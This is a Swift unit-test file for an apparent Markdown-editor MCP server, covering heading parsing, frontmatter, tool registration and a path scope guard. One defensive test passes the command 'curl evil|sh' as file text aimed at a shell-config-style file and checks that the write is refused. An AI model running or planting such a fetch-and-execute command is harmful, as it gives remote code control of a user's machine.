import XCTest

// MARK: - parseHeadings (Tools.swift)

final class HeadingParserTests: XCTestCase {

    func testEmptySource() {
        XCTAssertEqual(parseHeadings(source: ""), [])
    }

    func testNoHeadings() {
        let src = "Just paragraph text.\n\nMore paragraph text."
        XCTAssertEqual(parseHeadings(source: src), [])
    }

    func testSimpleHierarchy() {
        let src = """
        # H1
        body
        ## H2 alpha
        body
        ## H2 beta
        ### H3
        end
        """
        let result = parseHeadings(source: src)
        XCTAssertEqual(result, [
            HeadingHit(level: 1, text: "H1", line: 1),
            HeadingHit(level: 2, text: "H2 alpha", line: 3),
            HeadingHit(level: 2, text: "H2 beta", line: 5),
            HeadingHit(level: 3, text: "H3", line: 6),
        ])
    }

    func testIgnoresHeadingsInsideCodeFences() {
        let src = """
        # Real H1
        ```
        # Not a heading (inside code)
        ```
        ## Real H2
        """
        let result = parseHeadings(source: src)
        XCTAssertEqual(result.map(\.text), ["Real H1", "Real H2"])
    }

    func testRequiresSpaceAfterHashes() {
        // `#word` is not a heading per CommonMark — it's a hashtag.
        let src = """
        #not-a-heading
        # actually-a-heading
        """
        let result = parseHeadings(source: src)
        XCTAssertEqual(result.map(\.text), ["actually-a-heading"])
    }

    func testIndentedHeadingsHonoured() {
        // GFM lets a heading have up to 3 leading spaces.
        let src = "   # Indented heading"
        let result = parseHeadings(source: src)
        XCTAssertEqual(result.first?.text, "Indented heading")
    }

    func testLevelCappedAtSix() {
        // 7+ hashes should NOT be a heading (per CommonMark).
        let src = "####### too deep"
        let result = parseHeadings(source: src)
        XCTAssertEqual(result, [])
    }
}

// MARK: - parseFrontmatter / DocStats (DocumentRegistry.swift)

final class DocumentRegistryTests: XCTestCase {

    private var tempPath: String!

    override func setUp() {
        super.setUp()
        let tempDir = FileManager.default.temporaryDirectory
            .appendingPathComponent("PicaMDMCPTests-\(UUID().uuidString)")
        try? FileManager.default.createDirectory(at: tempDir,
                                                  withIntermediateDirectories: true)
        tempPath = tempDir.appendingPathComponent("doc.md").path
    }

    override func tearDown() {
        try? FileManager.default.removeItem(atPath: tempPath)
        tempPath = nil
        super.tearDown()
    }

    func testDocStatsForBareMarkdown() throws {
        let source = """
        # My title

        body line one
        body line two
        """
        try source.write(toFile: tempPath, atomically: true, encoding: .utf8)
        let stats = DocumentRegistry.stats(at: tempPath)
        XCTAssertEqual(stats.title, "My title",
                       "First H1 should be used as title when no frontmatter")
        XCTAssertEqual(stats.tags, [])
        XCTAssertEqual(stats.lineCount, 4)
        XCTAssertGreaterThan(stats.wordCount, 0)
    }

    func testDocStatsPullsTitleFromFrontmatter() throws {
        let source = """
        ---
        title: Frontmatter Title
        ---

        # Heading That Is Different

        body
        """
        try source.write(toFile: tempPath, atomically: true, encoding: .utf8)
        let stats = DocumentRegistry.stats(at: tempPath)
        XCTAssertEqual(stats.title, "Frontmatter Title",
                       "Frontmatter title beats first heading")
    }

    func testDocStatsParsesTagsFlowStyle() throws {
        let source = """
        ---
        title: Doc
        tags: [swift, markdown, mcp]
        ---

        body
        """
        try source.write(toFile: tempPath, atomically: true, encoding: .utf8)
        let stats = DocumentRegistry.stats(at: tempPath)
        XCTAssertEqual(stats.tags, ["swift", "markdown", "mcp"])
    }

    func testDocStatsParsesTagsCommaList() throws {
        let source = """
        ---
        tags: foo, bar, baz
        ---

        body
        """
        try source.write(toFile: tempPath, atomically: true, encoding: .utf8)
        let stats = DocumentRegistry.stats(at: tempPath)
        XCTAssertEqual(stats.tags, ["foo", "bar", "baz"])
    }

    func testDocStatsHandlesQuotedTitle() throws {
        let source = """
        ---
        title: "Quoted: With Punctuation"
        ---
        """
        try source.write(toFile: tempPath, atomically: true, encoding: .utf8)
        let stats = DocumentRegistry.stats(at: tempPath)
        XCTAssertEqual(stats.title, "Quoted: With Punctuation")
    }

    func testDocStatsFallsBackToFilename() throws {
        let source = "Just text, no heading, no frontmatter."
        try source.write(toFile: tempPath, atomically: true, encoding: .utf8)
        let stats = DocumentRegistry.stats(at: tempPath)
        XCTAssertEqual(stats.title, "doc")
    }

    func testStatsSurvivesMissingFile() {
        // Don't write anything — file doesn't exist.
        let stats = DocumentRegistry.stats(at: tempPath)
        // Should not crash; should fall back to filename-derived title.
        XCTAssertEqual(stats.title, "doc")
        XCTAssertEqual(stats.lineCount, 0)
        XCTAssertEqual(stats.wordCount, 0)
    }
}

// MARK: - ToolRegistry (ToolRegistry.swift)

final class ToolRegistryTests: XCTestCase {

    func testInvokeUnknownToolThrows() {
        let registry = ToolRegistry()
        XCTAssertThrowsError(try registry.invoke(params: ["name": "no-such-tool"]))
    }

    func testInvokeMissingNameThrows() {
        let registry = ToolRegistry()
        XCTAssertThrowsError(try registry.invoke(params: [:]))
    }

    func testInstallDefaultsExposesEightTools() {
        let registry = ToolRegistry()
        registry.installDefaults()
        let result = registry.toolsListResult()
        let tools = (result["tools"] as? [[String: Any]]) ?? []
        XCTAssertEqual(tools.count, 8)
        let names = Set(tools.compactMap { $0["name"] as? String })
        XCTAssertTrue(names.contains("workspace.openDocuments"))
        XCTAssertTrue(names.contains("workspace.search"))
        XCTAssertTrue(names.contains("document.outline"))
        XCTAssertTrue(names.contains("document.readLines"))
        XCTAssertTrue(names.contains("document.readSection"))
        XCTAssertTrue(names.contains("document.replaceLines"))
        XCTAssertTrue(names.contains("document.appendText"))
        XCTAssertTrue(names.contains("document.metadata"))
    }

    func testInvokeReturnsContentArrayShape() throws {
        let registry = ToolRegistry()
        registry.register(ToolRegistry.Tool(
            name: "echo",
            description: "test",
            inputSchema: [:],
            invoke: { args in
                ["echoed": args["msg"] ?? "(nothing)"]
            }
        ))
        let result = try registry.invoke(params: [
            "name": "echo",
            "arguments": ["msg": "hello"],
        ])
        // MCP shape: { content: [ { type: "text", text: "..." } ] }
        let content = try XCTUnwrap(result["content"] as? [[String: Any]])
        XCTAssertEqual(content.count, 1)
        XCTAssertEqual(content[0]["type"] as? String, "text")
        let text = try XCTUnwrap(content[0]["text"] as? String)
        // The text should be JSON containing the echoed value.
        XCTAssertTrue(text.contains("hello"))
    }
}

// MARK: - Tool implementations (Tools.swift)

final class ToolImplementationTests: XCTestCase {

    private var tempPath: String!
    private var registryURL: URL!

    override func setUp() {
        super.setUp()
        let tempDir = FileManager.default.temporaryDirectory
            .appendingPathComponent("PicaMDMCPTests-tools-\(UUID().uuidString)")
        try? FileManager.default.createDirectory(at: tempDir,
                                                  withIntermediateDirectories: true)
        tempPath = tempDir.appendingPathComponent("doc.md").path

        // Register tempPath as an "open" document so the scope guard in
        // requirePath admits it. Point DocumentRegistry at a staged
        // registry file instead of the real Application Support one.
        registryURL = tempDir.appendingPathComponent("active-documents.json")
        registerOpenDocuments([tempPath])
        DocumentRegistry.registryFileURLOverride = registryURL
    }

    override func tearDown() {
        DocumentRegistry.registryFileURLOverride = nil
        try? FileManager.default.removeItem(atPath: tempPath)
        try? FileManager.default.removeItem(at: registryURL)
        tempPath = nil
        registryURL = nil
        super.tearDown()
    }

    /// Write a staged active-documents.json listing the given paths as
    /// open, matching the JSON shape the main app's ActiveDocumentsRegistry
    /// produces.
    private func registerOpenDocuments(_ paths: [String]) {
        let iso = ISO8601DateFormatter().string(from: Date(timeIntervalSince1970: 1_700_000_000))
        let entries = paths.map { ["path": $0, "openedAt": iso] }
        let data = try! JSONSerialization.data(withJSONObject: entries)
        try! data.write(to: registryURL)
    }

    func testReadLinesReturnsRequestedRange() throws {
        let lines = (1...10).map { "line \($0)" }.joined(separator: "\n")
        try lines.write(toFile: tempPath, atomically: true, encoding: .utf8)

        let tool = DocumentTools.readLines()
        let result = try tool.invoke([
            "path": tempPath as Any,
            "start": 3,
            "end": 5,
        ]) as? [String: Any]
        let text = result?["text"] as? String
        XCTAssertEqual(text, "line 3\nline 4\nline 5")
    }

    func testReplaceLinesEditsFileAtomically() throws {
        let original = (1...5).map { "line \($0)" }.joined(separator: "\n")
        try original.write(toFile: tempPath, atomically: true, encoding: .utf8)

        let tool = DocumentTools.replaceLines()
        _ = try tool.invoke([
            "path": tempPath as Any,
            "start": 2,
            "end": 4,
            "text": "REPLACED",
        ])

        let after = try String(contentsOfFile: tempPath, encoding: .utf8)
        XCTAssertEqual(after, "line 1\nREPLACED\nline 5")
    }

    func testReadSectionReturnsHeadingSubtree() throws {
        let source = """
        # Doc

        intro

        ## Methods

        method body
        more method

        ## Results

        result body
        """
        try source.write(toFile: tempPath, atomically: true, encoding: .utf8)

        let tool = DocumentTools.readSection()
        let result = try tool.invoke([
            "path": tempPath as Any,
            "heading": "Methods",
        ]) as? [String: Any]
        let text = (result?["text"] as? String) ?? ""
        XCTAssertTrue(text.contains("## Methods"))
        XCTAssertTrue(text.contains("method body"))
        XCTAssertTrue(text.contains("more method"))
        XCTAssertFalse(text.contains("## Results"),
                       "readSection should stop before next same-level heading")
    }

    func testAppendTextAddsParagraphBreak() throws {
        try "existing body".write(toFile: tempPath,
                                    atomically: true, encoding: .utf8)
        _ = try DocumentTools.appendText().invoke([
            "path": tempPath as Any,
            "text": "new content",
        ])
        let after = try String(contentsOfFile: tempPath, encoding: .utf8)
        // Trailing newline + paragraph break + new content + final newline.
        XCTAssertTrue(after.contains("existing body"))
        XCTAssertTrue(after.contains("\n\nnew content"))
    }

    // MARK: - Scope guard (P0 security fix)

    func testReadLinesRejectsPathOutsideOpenDocuments() throws {
        // A path that exists but is NOT registered as open must be refused —
        // this is the prompt-injection-exfiltration defence.
        let outsideDir = FileManager.default.temporaryDirectory
            .appendingPathComponent("PicaMDMCPTests-outside-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: outsideDir, withIntermediateDirectories: true)
        let secret = outsideDir.appendingPathComponent("secret.md").path
        try "TOP SECRET".write(toFile: secret, atomically: true, encoding: .utf8)
        defer { try? FileManager.default.removeItem(at: outsideDir) }

        let tool = DocumentTools.readLines()
        XCTAssertThrowsError(try tool.invoke([
            "path": secret as Any, "start": 1, "end": 1,
        ])) { error in
            XCTAssertTrue("\(error)".contains("not an open PicaMD document"),
                          "expected scope-guard rejection, got \(error)")
        }
    }

    func testReplaceLinesRejectsPathOutsideOpenDocuments() throws {
        let outsideDir = FileManager.default.temporaryDirectory
            .appendingPathComponent("PicaMDMCPTests-outside-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: outsideDir, withIntermediateDirectories: true)
        let victim = outsideDir.appendingPathComponent("zshrc.md").path
        try "original".write(toFile: victim, atomically: true, encoding: .utf8)
        defer { try? FileManager.default.removeItem(at: outsideDir) }

        XCTAssertThrowsError(try DocumentTools.replaceLines().invoke([
            "path": victim as Any, "start": 1, "end": 1, "text": "curl evil|sh",
        ]))
        // The victim file must be untouched.
        XCTAssertEqual(try String(contentsOfFile: victim, encoding: .utf8), "original")
    }

    func testReadLinesAcceptsTraversalThatResolvesIntoOpenDoc() throws {
        // `<tempdir>/sub/../doc.md` canonicalizes to the registered tempPath,
        // so it must be ACCEPTED — the guard compares canonical forms, it
        // doesn't blanket-reject `..`.
        let lines = (1...3).map { "line \($0)" }.joined(separator: "\n")
        try lines.write(toFile: tempPath, atomically: true, encoding: .utf8)
        let dir = (tempPath as NSString).deletingLastPathComponent
        // Intermediate dir must exist for resolvingSymlinksInPath to
        // collapse `..` deterministically.
        try FileManager.default.createDirectory(atPath: dir + "/sub",
                                                withIntermediateDirectories: true)
        let traversal = dir + "/sub/../doc.md"

        let result = try DocumentTools.readLines().invoke([
            "path": traversal as Any, "start": 1, "end": 1,
        ]) as? [String: Any]
        XCTAssertEqual(result?["text"] as? String, "line 1")
    }
}
